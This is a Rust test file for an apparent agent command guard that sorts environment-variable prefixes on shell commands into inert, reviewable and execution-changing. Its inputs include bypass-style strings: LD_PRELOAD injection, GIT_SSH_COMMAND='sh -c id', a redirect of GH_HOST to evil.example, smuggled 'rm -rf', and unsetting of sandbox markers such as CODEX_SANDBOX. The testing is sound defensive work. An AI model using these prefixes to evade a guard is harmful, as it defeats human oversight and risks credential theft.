use super::{code_loading_setting, project, project_reviewed};

#[test]
fn inert_prefixes_are_removed_in_place() {
    for (command, expected) in [
        ("LC_ALL=C ls src", "ls src"),
        (
            "NO_COLOR=1 FORCE_COLOR=0 git status --short",
            "git status --short",
        ),
        ("env -u GH_TOKEN git -C repo status", "git -C repo status"),
        (
            "env -u GITHUB_TOKEN -u GH_TOKEN gh api repos/o/r --jq .full_name",
            "gh api repos/o/r --jq .full_name",
        ),
        (
            "env GH_TOKEN= GITHUB_TOKEN= gh repo view o/r --json name",
            "gh repo view o/r --json name",
        ),
        ("GH_TOKEN= gh repo view o/r", "gh repo view o/r"),
        ("GIT_PAGER=cat git log -3", "git log -3"),
        ("env --unset=GH_TOKEN -- git status", "git status"),
        (
            "env -u GIT_AUTHOR_NAME -u GIT_AUTHOR_EMAIL -u GIT_COMMITTER_NAME -u GIT_COMMITTER_EMAIL git commit -m 'test: isolate output'",
            "git commit -m 'test: isolate output'",
        ),
        ("env --unset=GIT_COMMITTER_DATE git commit --amend --no-edit", "git commit --amend --no-edit"),
        (
            "git status && LC_ALL=C rg -n 'a b' src | head -5",
            "git status && rg -n 'a b' src | head -5",
        ),
        ("TZ=\"UTC\" date", "date"),
    ] {
        assert_eq!(project(command).as_deref(), Some(expected), "{command}");
    }
}

#[test]
fn commands_without_inert_prefix_are_not_projected() {
    for command in [
        "ls src",
        "git status && rg x",
        "echo FOO=1",
        "ls >FOO=1",
        // Any program may read an unknown name; it is reviewed, not inert.
        "REPORT_WINDOW=7d ls",
        "NODE_ENV=test node --test",
    ] {
        assert_eq!(project(command), None, "{command}");
    }
}

#[test]
fn execution_changing_prefixes_leave_the_command_untouched() {
    for command in [
        "PATH=/tmp/shim:$PATH git status",
        "PATH=/tmp/shim git status",
        "LD_PRELOAD=/tmp/x.so ls",
        "DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls",
        "GIT_SSH_COMMAND='sh -c id' git fetch origin",
        "GIT_DIR=/tmp/other/.git git status",
        "GIT_CONFIG_GLOBAL=/tmp/cfg git status",
        "GH_HOST=evil.example gh api user",
        "GH_TOKEN=$(gh auth token --user other) gh repo view o/r",
        "GH_TOKEN=ghp_literal gh repo view o/r",
        "GITHUB_TOKEN=abc gh api user",
        "'LC_ALL=C' ls",
        "\"NO_COLOR=1\" ls",
        "L\"C_ALL\"=C ls",
        "NODE_OPTIONS=--require=/tmp/x.js node -v",
        "BASH_ENV=/tmp/rc bash -c true",
        "HOME=/tmp/fake git status",
        "XDG_CONFIG_HOME=/tmp/cfg git status",
        "PAGER=/tmp/pager git log",
        "GIT_PAGER='sh -c id' git log",
        "HTTPS_PROXY=http://proxy.example curl https://x.example",
        "https_proxy=http://proxy.example curl https://x.example",
        "RIPGREP_CONFIG_PATH=/tmp/rc rg x",
        "CURL_HOME=/tmp curl https://x.example",
        "FOO=`id` ls",
        "FOO=~/x ls",
        "FOO=*.env ls",
        "FOO=1",
        "FOO=1 && rm -rf x",
        "env",
        "env -i git status",
        "env -C /tmp git status",
        "env -S 'sh -c id'",
        "env -u PATH git status",
        "env -u HOME git status",
        "env -u GIT_CONFIG_NOSYSTEM git status",
        "env -u GIT_DIR git status",
        "env -u GIT_AUTHOR_NAME -u GIT_INDEX_FILE git commit -m x",
        "env FOO=$(id) ls",
        "env -u",
        "LC_ALL=C ls\nrm -rf x",
        "API_KEY=abc tool run",
        "BASH_FUNC_ls%%='() { id; }' ls",
    ] {
        assert_eq!(project(command), None, "{command}");
    }
}

#[test]
fn settings_that_point_tools_at_files_or_code_are_never_inert() {
    for command in [
        "OPENSSL_CONF=/ws/evil.cnf git fetch origin",
        "OPENSSL_CONF=evil.cnf node -e 1",
        "SSLKEYLOGFILE=/tmp/keys git push origin feature",
        "ESBUILD_BINARY_PATH=/tmp/esbuild vitest run",
        "PYTEST_ADDOPTS=-pevil pytest -q",
        "DOTNET_STARTUP_HOOKS=/tmp/x.dll ls",
        "JDK_JAVA_OPTIONS=-javaagent:/tmp/a.jar ls",
        "LUA_INIT=@/tmp/x.lua ls",
        "PHPRC=/tmp ls",
        "MAKEFILES=/tmp/x.mk make -n",
        "REPORT_DIR=.tmp/report ls",
        "REPORT_WINDOW=/etc ls",
        "FEATURE=--evil ls",
        "WIDGET_MODULE=evil ls",
    ] {
        assert_eq!(project(command), None, "{command}");
    }
}

#[test]
fn guard_markers_cannot_be_unset() {
    for command in [
        "env -u HOL_GUARD_HOME git status",
        "env -u GUARD_SESSION git status",
        "env -u CLAUDECODE git status",
        "env -u CODEX_SANDBOX git status",
    ] {
        assert_eq!(project(command), None, "{command}");
    }
}

#[test]
fn reviewable_settings_project_and_name_the_first_setting() {
    let reviewed = project_reviewed(
        "REPORT_DIR=/ws/out REPORT_NOW=2026-10-11T12:00:00.000Z node scripts/report.mjs",
        Default::default(),
    )
    .unwrap();
    assert_eq!(reviewed.command, "node scripts/report.mjs");
    assert_eq!(reviewed.setting, "REPORT_DIR");
    let reviewed = project_reviewed(
        "env APP_REGION=eu LC_ALL=C git fetch origin",
        Default::default(),
    )
    .unwrap();
    assert_eq!(reviewed.command, "git fetch origin");
    assert_eq!(reviewed.setting, "APP_REGION");
}

#[test]
fn private_temp_settings_project_only_for_review() {
    for command in [
        r#"OUT_DIR="$TMPDIR/report-test" bunx vitest run a.test.ts"#,
        r#"OUT_DIR="${TMPDIR}/report-test" PORT=4173 bunx vitest run a.test.ts"#,
        "OUT_DIR=$TMPDIR/report-test bunx vitest run a.test.ts",
    ] {
        let reviewed =
            project_reviewed(command, Default::default()).unwrap_or_else(|| panic!("{command}"));
        assert_eq!(reviewed.command, "bunx vitest run a.test.ts", "{command}");
        assert_eq!(reviewed.setting, "OUT_DIR", "{command}");
        assert_eq!(project(command), None, "{command}");
    }
    for command in [
        r#"OUT_DIR="$HOME/report-test" bunx vitest run a.test.ts"#,
        r#"OUT_DIR="$TMPDIRS/x" bunx vitest run a.test.ts"#,
        r#"OUT_DIR="${TMPDIR:-/Users/nobody}/x" bunx vitest run a.test.ts"#,
        r#"OUT_DIR="$TMPDIR/$(id -un)" bunx vitest run a.test.ts"#,
        r#"OUT_DIR="$TMPDIR/*" bunx vitest run a.test.ts"#,
        r#"OUT_DIR='$TMPDIR/x' bunx vitest run a.test.ts"#,
        r#"TMPDIR=/Users/nobody OUT_DIR="$TMPDIR/x" bunx vitest run a.test.ts"#,
        r#"export TMPDIR=/Users/nobody; OUT_DIR="$TMPDIR/x" bunx vitest run a.test.ts"#,
    ] {
        assert!(
            project_reviewed(command, Default::default()).is_none(),
            "{command}"
        );
    }
}

#[test]
fn reviewed_projection_refuses_program_loader_and_credential_settings() {
    for command in [
        "LC_ALL=C ls",
        "ls src",
        "PATH=/tmp/shim git status",
        "LD_PRELOAD=/tmp/x.so ls",
        "DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls",
        "GIT_SSH_COMMAND='sh -c id' git fetch origin",
        "GH_HOST=evil.example gh api user",
        "GH_TOKEN=ghp_literal gh repo view o/r",
        "API_TOKEN=abc node x.mjs",
        "HTTPS_PROXY=http://proxy.example node x.mjs",
        "BASH_ENV=/tmp/rc bash -c true",
        "HOME=/tmp/fake git status",
        "NODE_PATH=$HOME/x node x.mjs",
        "NODE_PATH=`id` node x.mjs",
        "HOL_GUARD_MODE=off git status",
        "NODE_OPTIONS=--require=./x.js node x.mjs",
        "env OPENSSL_CONF=/ws/a.cnf git fetch origin",
        "RUSTFLAGS='-C linker=./x' cargo build",
        "RUSTC_WRAPPER=./x cargo build",
        "EDITOR=./x npm run release",
        "CC=./x npm run build",
        "PYTHONUSERBASE=/ws/site python x.py",
        "BUNDLE_GEMFILE=/ws/Gemfile bundle exec rake",
        "LESSOPEN='|/ws/x %s' less README.md",
        "LESSCLOSE=/ws/x less README.md",
        "'REPORT_DIR=out' node x.mjs",
        "PYTHONPATH=. aws s3 ls",
        "NODE_PATH=/ws/node_modules gh api user",
        "JAVA_HOME=/ws/jdk git status",
        "PYTHONPATH=src JAVA_HOME=/opt/jdk pytest -q",
        "PYTHONPATH=src NODE_OPTIONS=--require=./x.js python x.py",
        "PYTHONPATH='src tests' pytest -q",
        "PYTHONPATH=src::tests pytest -q",
        "NODE_PATH=-r node x.mjs",
        "PYTHONPATH=src hol-guard pytest-contained -- pytest -q",
    ] {
        assert!(
            project_reviewed(command, Default::default()).is_none(),
            "{command}"
        );
    }
}

#[test]
fn search_paths_are_reviewed_in_front_of_their_own_toolchain() {
    for (command, projected, setting) in [
        ("PYTHONPATH=src pytest -q", "pytest -q", "PYTHONPATH"),
        (
            "cd app && PYTHONPATH=src:tests python3.12 -m pytest",
            "cd app && python3.12 -m pytest",
            "PYTHONPATH",
        ),
        (
            "JAVA_HOME=/opt/jdk-21 ./gradlew build",
            "./gradlew build",
            "JAVA_HOME",
        ),
        (
            "env NODE_PATH=./node_modules node x.mjs",
            "node x.mjs",
            "NODE_PATH",
        ),
        (
            "REPORT_DIR=out PYTHONPATH=. python x.py",
            "python x.py",
            "REPORT_DIR",
        ),
    ] {
        let reviewed =
            project_reviewed(command, Default::default()).unwrap_or_else(|| panic!("{command}"));
        assert_eq!(reviewed.command, projected, "{command}");
        assert_eq!(reviewed.setting, setting, "{command}");
    }
}

#[test]
fn code_loading_settings_are_named_for_the_block_reason() {
    for (command, setting) in [
        ("NODE_PATH=/ws/node_modules node x.mjs", Some("NODE_PATH")),
        (
            "env LC_ALL=C NODE_OPTIONS=--inspect node x.mjs",
            Some("NODE_OPTIONS"),
        ),
        ("REPORT_DIR=out CC=./x npm run build", Some("CC")),
        ("cd app && PYTHONPATH=. python x.py", Some("PYTHONPATH")),
        ("REPORT_DIR=out node x.mjs", None),
        ("echo NODE_PATH=/ws | cat", None),
        ("node x.mjs NODE_PATH=/ws", None),
        ("NODE-PATH=/ws node x.mjs", None),
    ] {
        assert_eq!(
            code_loading_setting(command).as_deref(),
            setting,
            "{command}"
        );
    }
}

#[test]
fn prefixes_before_guard_launchers_are_never_projected() {
    for command in [
        "FOO=1 hol-guard pytest-contained -- pytest -q",
        "env -u GH_TOKEN hol-guard pytest-contained -- pytest -q",
        "NO_COLOR=1 /usr/local/bin/hol-guard status",
    ] {
        assert_eq!(project(command), None, "{command}");
    }
}
